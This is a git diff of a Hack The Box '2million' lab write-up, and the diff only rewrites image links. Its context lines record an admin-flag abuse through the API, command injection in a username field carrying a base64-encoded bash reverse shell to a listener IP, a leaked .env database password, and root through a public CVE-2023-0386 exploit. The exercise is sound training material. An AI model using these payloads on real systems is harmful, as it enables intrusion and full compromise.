@@ -23,16 +23,16 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 ## Port 80
-![[Pasted image 20260610075823.png]]
+![Pasted image 20260610075823](../Attachments/Pasted%20image%2020260610075823.png)
 
 - It talks of doing a challenge to get login creds:
-![[Pasted image 20260610075848.png]]
+![Pasted image 20260610075848](../Attachments/Pasted%20image%2020260610075848.png)
 
 - This leads to the invite page:
-![[Pasted image 20260610075909.png]]
+![Pasted image 20260610075909](../Attachments/Pasted%20image%2020260610075909.png)
 
 - Checking the source code there is something interesting:
-![[Pasted image 20260610081229.png]]
+![Pasted image 20260610081229](../Attachments/Pasted%20image%2020260610081229.png)
 
 ```
 <!-- scripts --> 
@@ -78,7 +78,7 @@ curl -X POST http://2million.htb/api/v1/invite/how/to/generate
 ```
 
 - Accessing it I get another code:
-![[Pasted image 20260610081929.png]]
+![Pasted image 20260610081929](../Attachments/Pasted%20image%2020260610081929.png)
 
 - Then either using an LLM or a beautifier app (https://beautifier.io/) I make the code more readably:
 
@@ -115,7 +115,7 @@ if ('this_is' == /an_example/) {
 ```
 
 - The code is still obfuscated so using a deobfuscator like `de4js` I manage to deobfuscate it:
-![[Pasted image 20260610083733.png]]
+![Pasted image 20260610083733](../Attachments/Pasted%20image%2020260610083733.png)
 
 ```
 function verifyInviteCode(code) {
@@ -159,7 +159,7 @@ curl -X POST http://2million.htb/api/v1/invite/how/to/generate
 ---OUTPUT---
 {"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}                                  
 ```
-![[Pasted image 20260610083931.png]]
+![Pasted image 20260610083931](../Attachments/Pasted%20image%2020260610083931.png)
 
 ```
 ---REQUEST---
@@ -194,7 +194,7 @@ Content-Length: 249
 ```
 
 - its a ROT13 encryption with encrypted data. using an online rot13 decryptor I decrypt the data:
-![[Pasted image 20260610091746.png]]
+![Pasted image 20260610091746](../Attachments/Pasted%20image%2020260610091746.png)
 ```
 ---ENCRYPTED-TEXT---
 Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr
@@ -208,7 +208,7 @@ In order to generate the invite code, make a POST request to \/api\/v1\/invite\/
 curl -X POST http://2million.htb/api/v1/invite/generate
 {"0":200,"success":1,"data":{"code":"SUVMMUYtUlRTWTctUjBKUlEtN0JHSzE=","format":"encoded"}}
 ```
-![[Pasted image 20260610091913.png]]
+![Pasted image 20260610091913](../Attachments/Pasted%20image%2020260610091913.png)
 
 - I receive a code `SUVMMUYtUlRTWTctUjBKUlEtN0JHSzE=` encrypted in base64
 - Decrypting it:
@@ -217,9 +217,9 @@ echo "SUVMMUYtUlRTWTctUjBKUlEtN0JHSzE=" | base64 -d
 IEL1F-RTSY7-R0JRQ-7BGK1
 ```
 - Entering the code allows me to access register where I can create a profile `test:test`:
-![[Pasted image 20260610092115.png]]
+![Pasted image 20260610092115](../Attachments/Pasted%20image%2020260610092115.png)
 - I can then login to the portal:\
-![[Pasted image 20260610092218.png]]
+![Pasted image 20260610092218](../Attachments/Pasted%20image%2020260610092218.png)
 
 - Moving to `Access` and clicking on `Conncetion Pack` downloads an OVPN and gives the following response in burpsuite:
 ```
@@ -509,11 +509,11 @@ Content-Length: 800
 {"v1":{"user":{"GET":{"\/api\/v1":"Route List","\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation","\/api\/v1\/invite\/generate":"Generate invite code","\/api\/v1\/invite\/verify":"Verify invite code","\/api\/v1\/user\/auth":"Check if user is authenticated","\/api\/v1\/user\/vpn\/generate":"Generate a new VPN configuration","\/api\/v1\/user\/vpn\/regenerate":"Regenerate VPN configuration","\/api\/v1\/user\/vpn\/download":"Download OVPN file"},"POST":{"\/api\/v1\/user\/register":"Register a new user","\/api\/v1\/user\/login":"Login with existing user"}},"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}}}}
 ```
 
-![[Pasted image 20260611074054.png]]
+![Pasted image 20260611074054](../Attachments/Pasted%20image%2020260611074054.png)
 
-![[Pasted image 20260611074112.png]]
+![Pasted image 20260611074112](../Attachments/Pasted%20image%2020260611074112.png)
 
-![[Pasted image 20260611074126.png]]
+![Pasted image 20260611074126](../Attachments/Pasted%20image%2020260611074126.png)
 - Initially I send a test post request to the endpoint `/api/v1/admin/settings/update` and get an error message :
 ```
 PUT /api/v1/admin/settings/update HTTP/1.1
@@ -548,7 +548,7 @@ Content-Length: 53
 
 {"status":"danger","message":"Invalid content type."}
 ```
-![[Pasted image 20260611080620.png]]
+![Pasted image 20260611080620](../Attachments/Pasted%20image%2020260611080620.png)
 
 - Most API endpoints use JSON (and we know it is using JSON here), so we set the content type to `application/json`
 - On doing that I receive a different disponse : `Missing parameter email`:
@@ -586,7 +586,7 @@ Content-Length: 56
 
 {"status":"danger","message":"Missing parameter: email"}
 ```
-![[Pasted image 20260611080643.png]]
+![Pasted image 20260611080643](../Attachments/Pasted%20image%2020260611080643.png)
 
 - I then set the email parameter to my account:
 ```
@@ -621,7 +621,7 @@ Content-Length: 59
 
 {"status":"danger","message":"Missing parameter: is_admin"}
 ```
-![[Pasted image 20260611080710.png]]
+![Pasted image 20260611080710](../Attachments/Pasted%20image%2020260611080710.png)
 
 - I then add the `is_admin parameter` and set to true (JSON syntax is usually true so entering yes or some other value will not work and it will say email parameter missing again):
 ```
@@ -656,7 +656,7 @@ Content-Length: 76
 
 {"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}
 ```
-![[Pasted image 20260611080815.png]]
+![Pasted image 20260611080815](../Attachments/Pasted%20image%2020260611080815.png)
 
 - Finally I know I need to set it ot value 1 instead to make the user admin:
 ```
@@ -691,10 +691,10 @@ Content-Length: 40
 
 {"id":13,"username":"test","is_admin":1}
 ```
-![[Pasted image 20260611080910.png]]
+![Pasted image 20260611080910](../Attachments/Pasted%20image%2020260611080910.png)
 
 - I vcan confirm by checking the ndpoint: `/api/v1/admin/auth`
-![[Pasted image 20260611081023.png]]
+![Pasted image 20260611081023](../Attachments/Pasted%20image%2020260611081023.png)
 
 - As we see it is now changed to true.
 - Now accessing the endpoint to generate a vpn connection for adother user, we get a prameter missing error again
@@ -727,7 +727,7 @@ Content-Length: 59
 {"status":"danger","message":"Missing parameter: username"}
 
 ```
-![[Pasted image 20260611081307.png]]
+![Pasted image 20260611081307](../Attachments/Pasted%20image%2020260611081307.png)
 
 - I get a VPN generated when i use my username:
 ```
@@ -973,7 +973,7 @@ bfd36c19a809981c06a91882b6800549
 </tls-auth>
 
 ```
-![[Pasted image 20260611081810.png]]
+![Pasted image 20260611081810](../Attachments/Pasted%20image%2020260611081810.png)
 
 - But we can anyway already generate this without being admin.
 - If this PHP code is using exec or system commands we possibly oculd do command injection if filtering isnt done right. Doing a simply test I get a response that this is being run by `www-data`:
@@ -1011,7 +1011,7 @@ Content-Length: 9
 www-data
 ```
 
-![[Pasted image 20260611081751.png]]
+![Pasted image 20260611081751](../Attachments/Pasted%20image%2020260611081751.png)
 
 - I try to catch a shell byh passing my payload into this command injection vulnerability:
 ```
@@ -1031,7 +1031,7 @@ Content-Length: 75
 {
   "username": "test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40MS85OTk5IDA+JjEK | base64 -d | bash"}
 ```
-![[Pasted image 20260611082057.png]]
+![Pasted image 20260611082057](../Attachments/Pasted%20image%2020260611082057.png)
 
 - The base 64 was generated from my payload:
 ```
@@ -1039,10 +1039,10 @@ echo "bash -i >& /dev/tcp/10.10.16.41/9999 0>&1" | base64
 
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40MS85OTk5IDA+JjEK
 ```
-![[Pasted image 20260611082041.png]]
+![Pasted image 20260611082041](../Attachments/Pasted%20image%2020260611082041.png)
 
 - I catch a shell on my netcat listener:
-![[Pasted image 20260611082121.png]]
+![Pasted image 20260611082121](../Attachments/Pasted%20image%2020260611082121.png)
 
 - In the shell I find a `.env` file holding username and password:
 ```
@@ -1054,17 +1054,17 @@ DB_DATABASE=htb_prod
 DB_USERNAME=admin
 DB_PASSWORD=SuperDuperPass123
 ```
-![[Pasted image 20260611082407.png]]
+![Pasted image 20260611082407](../Attachments/Pasted%20image%2020260611082407.png)
 
 - I switch to admin user (as there is a user admin and the creds work on it):
 ```
 su admin
 > SuperDuperPass123
 ```
-![[Pasted image 20260611082558.png]]
+![Pasted image 20260611082558](../Attachments/Pasted%20image%2020260611082558.png)
 
 - I grab the user flag:
-![[Pasted image 20260611082633.png]]
+![Pasted image 20260611082633](../Attachments/Pasted%20image%2020260611082633.png)
 
 ## Privilege Escalation 
 - Checking mail in `/var/mail` I find something interesting:
@@ -1097,7 +1097,7 @@ mysql -u admin -p<pass>
 > show tables;
 > select * from users;
 ```
-![[Pasted image 20260611083114.png]]
+![Pasted image 20260611083114](../Attachments/Pasted%20image%2020260611083114.png)
 
 - Looking online baout this `OverlayFS/FUSE` and I find a CVE CVE-2023-0386 with an exploit: https://github.com/puckiestyle/CVE-2023-0386
 
@@ -1148,7 +1148,7 @@ fuse.c:221:5: warning: implicit declaration of function ‘rmdir’ [-Wimplicit-
 gcc -o exp exp.c -lcap
 gcc -o gc getshell.c
 ```
-![[Pasted image 20260611091226.png]]
+![Pasted image 20260611091226](../Attachments/Pasted%20image%2020260611091226.png)
 
 - I pass the first part of the exploit and run it in background:
 ```
@@ -1158,7 +1158,7 @@ gcc -o gc getshell.c
 ---OUTPUT---
 [1] 38145
 ```
-![[Pasted image 20260611091252.png]]
+![Pasted image 20260611091252](../Attachments/Pasted%20image%2020260611091252.png)
 
 - I run the second part of the exploit and become root:
 ```
@@ -1194,13 +1194,13 @@ See "man sudo_root" for details.
 
 root@2million:/tmp/CVE-2023-0386#
 ```
-![[Pasted image 20260611091332.png]]
+![Pasted image 20260611091332](../Attachments/Pasted%20image%2020260611091332.png)
 
 - I become root:
-![[Pasted image 20260611091357.png]]
+![Pasted image 20260611091357](../Attachments/Pasted%20image%2020260611091357.png)
 
 - I grab root flag:
-![[Pasted image 20260611091418.png]]
+![Pasted image 20260611091418](../Attachments/Pasted%20image%2020260611091418.png)
 
 ### Alternate PrivEsc
 - Checking GLIBC version:
@@ -1244,7 +1244,7 @@ try 800
 try 900                                                                                                
 #
 ```
-![[Pasted image 20260611095832.png]]
+![Pasted image 20260611095832](../Attachments/Pasted%20image%2020260611095832.png)
 
 
 ### Additional Data
@@ -1267,11 +1267,11 @@ root@2million:/root# cat thank_you.json
 ```
 {"encryption": "xor", "encrpytion_key": "HackTheBox", "encoding": "base64", "data": "DAQCGXQgBCEELCAEIQQsSCYtAhU9DwofLURvSDgdaAARDnQcDTAGFCQEB0sgB0UjARYnFA0IMUgEYgIXJQQNHzsdFmICESQEEB87BgBiBhZoDhYZdAIKNx0WLRhDHzsPADYHHTpPQzw9HA1iBhUlBA0YMUgPLRZYKQ8HSzMaBDYGDD0FBkd0HwBiDB0kBAEZNRwAYhsQLUECCDwBADQKFS0PF0s7DkUwChkrCQoFM0hXYgIRJA0KBDpIFycCGToKAgk4DUU3HB06EkJLAAAMMU8RJgIRDjABBy4KWC4EAh90Hwo3AxxoDwwfdAAENApYKgQGBXQYCjEcESoNBksjAREqAA08QQYKNwBFIwEcaAQVDiYRRS0BHWgOBUstBxBsZXIOEwwGdBwNJ08OLRMaSzYNAisBFiEPBEd0IAQhBCwgBCEELEgNIxxYKgQGBXQKECsDDGgUEwQ6SBEqClgqBA8CMQ5FNgcZPEEIBTsfCScLHy1BEAM1GgwsCFRoAgwHOAkHLR0ZPAgMBXhIBCwLWCAADQ8nRQosTx0wEQYZPQ0LIQpYKRMGSzIdCyYOFS0PFwo4SBEtTwgtExAEOgkJYg4WLEETGTsOADEcEScPAgd0DxctGAwgT0M/Ow8ANgcdOk1DHDFIDSMZHWgHDBggDRcnC1gpD0MOOh4MMAAWJQQNH3QfDScdHWgIDQU7HgQ2BhcmQRcDJgETJxxYKQ8HSycDDC4DC2gAEQ50AAosChxmQSYKNwBFIQcZJA0GBTMNRSEAFTgNBh8xDEliChkrCUMGNQsNKwEdaAIMBSUdADAKHGRBAgUwSAA0CgoxQRAAPQQJYgMdKRMNDjBIDSMcWCsODR8mAQc3Gx0sQRcEdBwNJ08bJw0PDjccDDQKWCEPFw44BAwlChYrBEMfPAkRYgkNLQ0QSyAADDFPDiEDEQo6HEUhABUlFA0CIBFLSGUsJ0EGCjcARSMBHGgEFQ4mEUUvChUqBBFLOw5FNgcdaCkCCD88DSctFzBBAAQ5BRAsBgwxTUMfPAkLKU8BJxRDDTsaRSAKESYGQwp0GAQwG1gnB0MfPAEWYgYWKxMGDz0KCSdPEicUEQUxEUtiNhc9E0MIOwYRMAYaPRUKBDobRSoODi1BEAM1GAAmTwwgBEMdMRocYgkZKhMKCHQHA2IADTpBEwc1HAMtHRVoAA0PdAELMR8ROgQHSyEbRTYAWCsODR89BhAjAxQxQQoFOgcTIxsdaAAND3QNEy0DDi1PQzwxSAQwClghDA4OOhsALhZYOBMMHjBICiRPDyAAF0sjDUUqDg4tQQIINwcIMgMROwkGD3QcCiUKDCAEEUd0CQsmTw8tQQYKMw0XLhZYKQ8XAjcBFSMbHWgVCw50Cwo3AQwkBBAYdAUMLgoLPA4NDidIHCcbWDwOQwg7BQBsZXIABBEOcxtFNgBYPAkGSzoNHTZPGyAAEx8xGkliGBAtEwZLIw1FNQYUJEEABDocDCwaHWgVDEskHRYqTwwgBEMJOx0LJg4KIQQQSzsORSEWGi0TEA43HRcrGwFkQQoFJxgMMApYPAkGSzoNHTZPHy0PBhk1HAwtAVgnB0MOIAAMIQ4UaAkCCD8NFzFDWCkPB0s3GgAjGx1oAEMcOxoJJk8PIAQRDnQDCy0YFC0FBA50ARZiDhsrBBAYPQoJJ08MJ0ECBzhGb0g4ETwJQw8xDRUnHAxoBhEKIAERNwsdZGtpPzwNRQoOGyM1Cw4WBx1iOx0pDA=="}
 ```
-![[Pasted image 20260611100339.png]]
+![Pasted image 20260611100339](../Attachments/Pasted%20image%2020260611100339.png)
 
 - We see its base64 encoded and XORd with an encyption key "HackTheBox"
 - Using CyberChef I decode this bit:https://gchq.github.io/CyberChef/
-![[Pasted image 20260611100807.png]]
+![Pasted image 20260611100807](../Attachments/Pasted%20image%2020260611100807.png)
 
 - Exact url with full data: https://gchq.github.io/CyberChef/#input=N2IyMjY1NmU2MzcyNzk3MDc0Njk2ZjZlMjIzYTIwMjI3ODZmNzIyMjJjMjAyMjY1NmU2MzcyNzA3OTc0Njk2ZjZlNWY2YjY1NzkyMjNhMjAyMjQ4NjE2MzZiNTQ2ODY1NDI2Zjc4MjIyYzIwMjI2NTZlNjM2ZjY0Njk2ZTY3MjIzYTIwMjI2MjYxNzM2NTM2MzQyMjJjMjAyMjY0NjE3NDYxMjIzYTIwMjI0NDQxNTE0MzQ3NTg1MTY3NDI0MzQ1NDU0YzQzNDE0NTQ5NTE1MTczNTM0MzU5NzQ0MTY4NTUzOTQ0Nzc2ZjY2NGM1NTUyNzY1MzQ0Njc2NDYxNDE0MTUyNDQ2ZTUxNjM0NDU0NDE0NzQ2NDM1MTQ1NDIzMDczNjc0MjMwNTU2YTQxNTI1OTZlNDY0MTMwNDk0ZDU1Njc0NTU5Njc0OTU4NGE1MTUxNGU0ODdhNzM2NDQ2NmQ0OTQzNDU1MzUxNDU0NTQyMzgzNzQyNjc0MjY5NDI2ODVhNmY0NDY4NTk1YTY0NDE0OTRiNGU3ODMwNTc0YzUyNjg0NDQ4N2E3MzUwNDE0NDU5NDg0ODU0NzA1MDUxN2E3NzM5NDg0MTMxNjk0MjY4NTU2YzQyNDEzMDU5NGQ1NTY3NTA0YzUyNWE1OTRiNTEzODQ4NTM3YTRkNjE0MjQ0NTk0NzQ0NDQzMDQ2NDI2YjY0MzA0ODc3NDI2OTQ0NDIzMDZiNDI0MTQ1NWE0ZTUyNzc0MTU5Njg3MzUxNGM1NTQ1NDM0MzQ0Nzc0MjQxNDQ1MTRiNDY1MzMwNTA0NjMwNzMzNzQ0NmI1NTc3NDM2ODZiNzI0MzUxNmY0NjRkMzA2ODU4NTk2NzQ5NTI0YTQxMzA0YjQyNDQ3MDQ5NDY3OTYzNDM0NzU0NmY0YjQxNjc2YjM0NDQ1NTU1MzM0ODQyMzAzNjQ1NmI0YTRjNDE0MTQxNGQ0ZDU1Mzg1MjRhNjc0OTUyNDQ2YTQxNDI0Mjc5MzQ0YjU3NDMzNDQ1NDE2ODM5MzA0ODc3NmYzMzQxNzg3ODZmNDQ3Nzc3NjY2NDQxNDE0NTRlNDE3MDU5NGI2NzUxNDc0MjU4NTE1OTQzNmE0NTYzNDU1MzZmNGU0MjZiNzM2YTQxNTI0NTcxNDE0MTMwMzg1MTUxNTk0YjRlNzc0MjQ2NDk3NzQ1NjM2MTQxNTE1NjQ0Njk1OTUyNTI1MzMwNDI0ODU3Njc0ZjQyNTU3Mzc0NDI3ODQyNzM1YTU4NDk0ZjQ1Nzc3NzQ3NjQ0Mjc3NGU0YTMwMzg0ZjRjNTI0ZDYxNTM3YTU5NGU0MTY5NzM0MjQ2Njk0NTUwNDI0NTY0MzA0OTQxNTE2ODQyNDM3NzY3NDI0MzQ1NDU0YzQ1Njc0ZTQ5Nzg3ODU5NGI2NzUxNDc0MjU4NTE0YjQ1NDM3MzQ0NDQ0NzY3NTU0NTc3NTEzNjUzNDI0NTcxNDM2YzY3NzE0MjQxMzg0MzRkNTEzNTQ2NGU2NzYzNWE1MDQ1NDU0OTQyNTQ3MzY2NDM1MzYzNGM0ODc5MzE0MjQ1NDE0ZDMxNDc2Nzc3NzM0MzQ2NTI2ZjQxNjc3NzQ4NGY0MTZiNDg0YzUyMzA1YTUwNDE2NzRkNDI1ODY4NDk0MjQzNzc0YzU3NDM0MTQxNDQ1MTM4NmU1MjUxNmY3MzU0NzgzMDc3NDU1MTU5NWE1MDUxMzA0YzQ5NTE3MDU5NGI1MjRkNDc1MzdhNDk2NDQzNzk1OTRmNDY1MzMwNTA0Njc3NmYzNDUzNDI0NTc0NTQ3NzY3NzQ0NTc4NDE0NTRmNjc2YjRhNTk2NzM0NTc0YzQ1NDU1NDQ3NTQ3MzRmNDE0NDQ1NjM0NTUzNjM1MDQxNjc2NDMwNDQ3ODYzNzQ0NzQxNzc2NzU0MzA0ZDJmNGY3NzM4NDE0ZTY3NjM2NDRmNmIzMTQ0NDg0NDQ2NDk0NDUzNGQ1YTQ4NTc2NzQ4NDQ0MjY3Njc0NDUyNjM2ZTQzMzE2NzcwNDQzMDRkNGY0ZjY4MzQ0ZDRkNDE0MTU3NGE1MTUxNGU0ODMzNTE2NjQ0NTM2MzY0NDg1NzY3NDk0NDUxNTUzNzQ4Njc1MTMyNDI2ODYzNmQ1MTUyNjM0NDRhNjc0NTU0NGE3ODc4NTk0YjUxMzg0ODUzNzk2MzQ0NDQ0MzM0NDQ0MzMyNjc0MTQ1NTEzNTMwNDE0MTZmNzM0MzY4Nzg2ZDUxNTM1OTRiNGU3NzQyNDY0OTUxNjM1YTRhNDEzMDQ3NDI1NDRkNGU1MjUzNDU0MTQ2NTQ2NzRlNDI2ODM4Nzg0NDQ1NmM2OTQzNjg2YjcyNDM1NTRkNDc0ZTUxNzM0ZTRiNzc0NTY0NjE0MTQ5NGQ0MjUzNTU2NDQxNDQ0MTRiNDg0NzUyNDI0MTY3NTU3NzUzNDE0MTMwNDM2NzZmNzg1MTUyNDE0MTUwNTE1MTRhNTk2NzRkNjQ0YjUyNGQ0ZTQ0NmE0MjQ5NDQ1MzRkNjM1NzQzNzM0ZjQ0NTIzODZkNDE1MTYzMzM0Nzc4MzA3MzUxNTI2MzQ1NjQ0Mjc3NGU0YTMwMzg2MjRhNzczMDUwNDQ2YTYzNjM0NDQ0NTE0YjU3NDM0NTUwNDY3NzM0MzQ0MjQxNzc2YzQzNjg1OTcyNDI0NTRkNjY1MDQxNmI1MjU5Njc2YjRlNGM1MTMwNTE1Mzc5NDE0MTQ0NDQ0NjUwNDQ2OTQ1NDQ0NTUxNmYzNjQ4NDU1NTY4NDE0MjU1NmM0NjQxMzA0MzQ5NDI0NjRjNTM0NzU1NzM0YTMwNDU0NzQzNmE2MzQxNTI1MzRkNDI0ODQ3Njc0NTQ2NTEzNDZkNDU1NTU1NzY0MzY4NTU3MTQyNDI0NjRjNGY3NzM1NDY0ZTY3NjM2NDYxNDM2YjQzNDM0NDM4Mzg0NDUzNjM3NDQ2N2E0MjQyNDE0MTUxMzU0MjUyNDE3MzQyNjc3Nzc4NTQ1NTRkNjY1MDQxNmI0YzRiNTUzODQyNGE3ODUyNDQ0NDU0NzM2MTUyNTM0MTRiNDU1MzU5NDc1MTc3NzAzMDQ3NDE1MTc3NDczMTY3NmU0MjMwNGQ2NjUwNDE0NTU3NTk2NzU5NTc0Yjc4NGQ0NzQ0N2EzMDRiNDM1MzY0NTA0NTY5NjM1NTQ1NTE1NTc4NDU1NTc0Njk0ZTY4NjMzOTQ1MzA0ZDQ5NGY3NzU5NTI0ZDQxNTk2MTUwNTI1NTRiNDI0NDZmNjI1MjUzNmY0ZjQ0NjkzMTQyNDU0MTRkMzE0NzQxNDE2ZDU0Nzc3NzY3NDI0NTRkNjQ0ZDUyNmY2MzU5Njc2YjVhNGI2ODRkNGI0MzQ4NTE0ODQxMzI0OTQxNDQ1NDcwNDI0NTc3NjMzMTQ4NDE0ZDc0NDg1MjU2NmY0MTQxMzA1MDY0NDE0NTRjNGQ1MjM4NTI0ZjY3NTE0ODUzNzk0NTYyNTI1NDU5NDE1NzQzNzM0ZjQ0NTIzODM5NDI2ODQxNmE0MTc4NTE3ODUxNTE2ZjQ2NGY2NzYzNTQ0OTc4NzM2NDYxNDE0MTRlNDQzMzUxNGU0NTc5MzA0NDQ0NjkzMTUwNTE3YTc3Nzg1MzQxNTE3NzQzNmM2NzY4NDQ0MTM0NGY0ZjY4NzM0MTRjNjg1YTU5NGY0MjRkNGQ0ODZhNDI0OTQzNjk1MjUwNDQ3OTQxNDE0NjMwNzM2YTQ0NTU1NTcxNDQ2NzM0NzQ1MTUxNDk0OTRlNzc2MzQ5NGQ2NzRkNTI0Zjc3NmI0NzQ0MzM1MTYzNDM2OTU1NGI0NDQzNDE0NTQ1NTU2NDMwNDM1MTczNmQ1NDc3Mzg3NDUxNTE1OTRiNGQ3NzMwNTg0YzY4NWE1OTRiNTEzODU4NDE2YTYzNDI0NjUzNGQ2MjQ4NTc2NzU2NDM3NzM1MzA0Mzc3NmYzMzQxNTE3NzZiNDI0MjQxNTk2NDQxNTU0ZDRjNjc2ZjRjNTA0MTM0NGU0NDY5NjQ0OTQ4NDM2MzYyNTc0NDc3NGY1MTc3NjczNzQyNTE0MjczNWE1ODQ5NDE0MjQyNDU0ZjYzNzg3NDQ2NGU2NzQyNTk1MDQxNmI0NzUzN2E2ZjRlNDg1NDVhNTA0Nzc5NDE0MTQ1NzgzODc4NDc2YjZjNjk0NzQyNDE3NDQ1Nzc1YTRjNDk3NzMxNDY0ZTUxNTk1NTRhNDU0NTQxNDI0NDZmNjM0NDQzNzc2MTQ4NTc2NzU2NDQ0NTczNmI0ODUyNTk3MTU0Nzc3NzY3NDI0NTRkNGE0Zjc4MzA0YzRhNjczNDRiNDk1MTUxNTE1MzdhNzM0ZjUyNTM0NTU3NDc2OTMwNTQ0NTQxMzQzMzQ4NTI2MzcyNDc3NzQ2NmI1MTUxNmY0NjRhNzg2NzRkNGQ0MTcwNTk1MDQxNmI0NzUzN2E2ZjRlNDg1NDVhNTA0ODc5MzA1MDQyNjg2YjMxNDg0MTc3NzQ0MTU2Njc2ZTQyMzA0ZDRmNDk0MTQxNGQ0OTUxMzQ1NTYxNDE2YjQzNDM0NDM4NGU0NjdhNDY0NDU3NDM2YjUwNDIzMDczMzM0NzY3NDE2YTQ3NzgzMTZmNDE0NTRkNjM0Zjc4NmY0YTRhNmIzODUwNDk0MTUxNTI0NDZlNTE0NDQzNzkzMDU5NDY0MzMwNDY0MjQxMzUzMDQxNTI1YTY5NDQ2ODczNzI0MjQyNDE1OTUwNTE2ZjRhNGEzMDM4NGQ0YTMwNDU0MzQyN2E2ODQ3NjIzMDY3MzQ0NTU0Nzc0YTUxNzczODc4NDQ1MjU1NmU0ODQxNzg2ZjQyNjg0NTRiNDk0MTQ1NTI0ZTc3NzM2NDVhNDc3NDcwNTA3YTc3NGU1MjUxNmY0ZjQ3Nzk0ZDMxNDM3NzM0NTc0Mjc4MzE2OTRmNzgzMDcwNDQ0MTNkM2QyMjdk&ieol=CRLF&oeol=CRLF
 
